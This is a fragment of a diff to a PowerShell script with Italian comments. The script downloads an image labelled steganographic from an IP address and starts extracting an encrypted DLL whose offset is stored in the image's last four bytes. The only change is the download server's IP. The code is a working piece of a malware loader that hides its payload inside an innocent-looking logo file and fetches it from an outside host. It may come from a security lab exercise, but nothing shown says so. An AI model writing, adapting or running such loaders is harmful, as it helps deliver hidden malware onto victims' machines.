@@ -7,7 +7,7 @@
 $wc=New-Object Net.WebClient
 
 # ── Download immagine stego ────────────────────────────────────────────
-$img=$wc.DownloadData('https://192.168.41.124/logo_unisa.png')
+$img=$wc.DownloadData('https://192.168.42.124/logo_unisa.png')
 
 # ── Estrazione DLL cifrata (ultimi 4 byte = offset little-endian) ──────
 $off=[BitConverter]::ToInt32($img,$img.Length-4)
